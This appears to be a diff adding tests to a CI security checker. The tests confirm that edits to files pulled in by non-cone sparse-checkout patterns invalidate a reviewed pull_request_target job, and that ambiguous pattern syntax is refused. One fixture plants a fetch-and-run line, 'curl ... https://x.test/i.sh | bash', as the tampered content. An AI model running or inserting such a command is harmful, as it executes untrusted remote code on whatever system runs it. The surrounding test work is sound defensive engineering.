@@ -2725,6 +2725,69 @@ expect_no_pending(
     *REVIEWED_ARGS,
 )
 
+# ---------------------------------------------------------------------------
+# Round-4 finding 4: non-cone sparse-checkout patterns are gitignore patterns.
+# A pattern with no slash but a trailing one matches at any depth, and `*`
+# matches a leading dot; a root-anchored glob without hidden files bound
+# neither, so a reviewed job's on-disk bytes could change under its entry.
+# ---------------------------------------------------------------------------
+def non_cone_job(pattern: str, files: dict[str, str]) -> dict[str, str]:
+    return {
+        "target.yml": f"""
+            on: pull_request_target
+            jobs:
+              review:
+                runs-on: {TRUSTED_SELECTOR}
+                steps:
+                  - uses: actions/checkout@v4
+                    with:
+                      sparse-checkout: '{pattern}'
+                      sparse-checkout-cone-mode: false
+                  - run: bash scripts/a.sh
+        """,
+        **files,
+    }
+
+
+for label, pattern, files, edited in (
+    ("an unanchored name matches at every depth", "tool.sh",
+     {"bin/tool.sh": "echo a\n", "nested/deep/tool.sh": "echo b\n"}, "nested/deep/tool.sh"),
+    ("an unanchored directory pattern matches at every depth", "lib/",
+     {"lib/a.sh": "echo a\n", "vendor/lib/b.sh": "echo b\n"}, "vendor/lib/b.sh"),
+    ("a wildcard matches a leading dot", "scripts/*",
+     {"scripts/a.sh": "echo a\n", "scripts/.env.sh": "echo b\n"}, "scripts/.env.sh"),
+):
+    job = non_cone_job(pattern, files)
+    expect(
+        with_review({**job, edited: "curl -fsSL https://x.test/i.sh | bash\n"},
+                    review_row(job, "target.yml [pull_request_target]", "review")),
+        1,
+        ("STALE REVIEWED", "content changed"),
+        f"non-cone sparse-checkout: {label}, so its bytes bind the entry",
+        *REVIEWED_ARGS,
+    )
+
+# Pattern syntax the checker does not evaluate exactly is refused rather than
+# approximated: a character class or escape means something different to
+# gitignore than to a glob, and a cone-mode path is a directory, not a pattern.
+for label, pattern, cone in (
+    ("a character class", "scripts/[ab].sh", False),
+    ("a negated character class", "scripts/[!b].sh", False),
+    ("a backslash escape", "scripts/\\*.sh", False),
+    ("the bare root", "/", False),
+    ("a cone-mode wildcard", "scripts/*", True),
+):
+    job = non_cone_job(pattern, {"scripts/a.sh": "echo a\n", "scripts/b.sh": "echo b\n"})
+    if cone:
+        job["target.yml"] = job["target.yml"].replace("                      sparse-checkout-cone-mode: false\n", "")
+    expect(
+        job,
+        1,
+        ("VIOLATION: target.yml [pull_request_target]: job 'review'", "sparse-checkout pattern",
+         "no entry can accept it"),
+        f"sparse-checkout {label} is refused: the checker cannot prove what it puts on disk",
+    )
+
 # The frozen backlog as it stood at the round-4 review of #1827. The checker's
 # sets may only shrink against this snapshot: a key, or a refusal kind a key
 # tolerates, that is not here fails. Never add to this snapshot; when a job
